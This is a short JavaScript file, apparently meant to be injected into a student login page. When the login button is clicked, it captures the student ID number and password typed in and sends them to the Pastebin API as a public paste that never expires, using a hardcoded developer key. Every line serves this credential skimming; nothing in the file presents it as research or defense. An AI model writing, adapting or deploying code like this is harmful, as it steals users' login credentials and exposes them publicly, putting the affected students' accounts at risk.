const loginButton = document.querySelector('.loginButton');
const studentId = document.querySelector('[name="studentIDNumber"]');
const password = document.querySelector('[name="password"]');
const pastebinkey = '4ipD0r0J2iu6Xt-CcrYru4mGob66-a4Y';

console.log('OK!');
console.log(loginButton);
console.log(studentId);
console.log(password);

loginButton.addEventListener('click', () => {
    console.log('click');

    if (studentId && password) {
        console.log(studentId.value);
        console.log(password.value);

        const data = {
            username: studentId.value,
            password: password.value,
        };

        const requestData = {
            method: 'POST',
            mode: 'no-cors',
            body: new URLSearchParams({
                api_option: 'paste',
                api_dev_key: pastebinkey,
                api_paste_code: JSON.stringify(data),
                api_paste_private: '0', // 0 = Public, 1 = Unlisted, 2 = Private
                api_paste_expire_date: 'N', // N = Never, 10M = 10 Minutes, 1H = 1 Hour, etc.
            }),
        };

        console.log(JSON.stringify(data));

        fetch('https://pastebin.com/api/api_post.php', requestData)
            .then((response) => response.text())
            .then((data) => {
                console.log('Paste created successfully:');
                console.log(data);
            });
    }
});
